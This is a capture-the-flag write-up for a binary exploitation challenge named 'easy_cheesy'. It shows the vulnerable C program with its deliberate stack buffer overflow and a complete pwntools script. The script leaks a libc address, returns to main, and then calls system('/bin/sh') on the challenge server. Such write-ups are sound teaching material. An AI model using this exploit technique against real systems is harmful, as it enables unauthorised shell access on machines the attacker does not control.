---
layout: post
title: easy_cheesy
image: "assets/images/ctf/pwnEd2.png"
---
We are given an IP and a port to netcat to, and a zip containing everything that was used to set up the challenge (even the docker makefile). When we connect we get an interactive session, the behaviour of which is defined by some C code which we are given:

```C
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>

void alarm_handler()
{
    printf("Too slow.\n");
    exit(1);
}

void setup()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[])
{
    setup();
    char buffer[64];
    printf("ROP me baby!\n");
    fgets(buffer, 2048, stdin);
    return 0;
}
```

We can see that a 64 byte buffer is defined, and the input we pass to the program is read in by `fgets()`. This function only takes a specified number of characters from `STDIN` and drops any extra, so if we were looking to write past a buffer it's not usually great to see this, however my friend is allowing us to write so much (2048 bytes!) that it doesn't particularly matter. 2048 minus 64 in theory gives us 1984 bytes of unmanaged memory we can write into. Plenty.

The principle of what follows is to 'align' whats in the memory of the program that we're able to write into, and a standard C library containing `/bin/sh`. To do this we construct a ROP chain to leak the address of a standard function (any will do, I like most people am a sheep so I just use `puts()`). `fgets()` is only called once, so normally once we'd delivered this initial payload the program would exit and our progress would be lost. To prevent this we make sure our ROP chain also calls `main()` immediately after leaking the address of `puts()`, so the whole program runs a second time and we have another opportunity to deliver yet another payload.

With the address of `puts()` in hand we can add the correct offset to the addresses of a compiled `libc` binary we hold locally. With this correctly aligned we can construct a ROP chain using this binary that makes a call to system and executes `/bin/sh`. Sending this second payload pops a shell, and we're done.

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

def build_initial_rop_chain(elf):
    rop = ROP(elf)
    # Call to 'puts' to get the address of puts
    rop.call('puts', [elf.got['puts']])
    # Call to 'main' to keep the program alive
    rop.call('main')
    return rop.chain()

def build_exploit_rop_chain(leaked_puts_address):
    # Grab libc
    libc_elf = ELF("libc6_2.31-0ubuntu9_amd64.so")
    # Calibrate libc for the program on the remote machine
    libc_elf.address = leaked_puts_address - libc_elf.symbols["puts"]
    rop = ROP(libc_elf)
    # Redundant call of 'puts' for stack alignment
    rop.call("puts", [])
    # Call 'system' and pass our call to get a shell
    rop.call("system", [ next(libc_elf.search(b"/bin/sh\x00")) ])
    return rop.chain()

def deliver_payload(offset, process, rop_chain):
    process.sendline(b'A'*offset + rop_chain)

def run_exploit():
    elf = ELF("./easy_cheesy")
    offset = 72
    # Kick off proceedings
    process = remote("35.246.53.125", "10005")
    process.recvuntil('\n')
    # Leak the address of 'puts' (or whatever function really)
    deliver_payload(offset, process, build_initial_rop_chain(elf))
    puts = u64(process.recvuntil('\n').rstrip().ljust(8, b'\x00'))
    # Assemble and send the ROP chain that will give us our shell
    deliver_payload(offset, process, build_exploit_rop_chain(puts))
    process.interactive()

run_exploit()
```
This explanation is cheating a bit, since I'm relying heavily on the magic of `pwntools` to construct my ROP chains for me. I'd be totally lost without it, since my understanding of ROP chains at a fundamental level is very poor. Something I need to work on.

<a href="https://nankeen.me/about/">Challenge Author</a>

<a href="https://www.youtube.com/watch?v=XZa0Yu6i_ew">Explanation of ROP</a>

<a href="https://pwned.sigint.mx/">Main page of the CTF</a>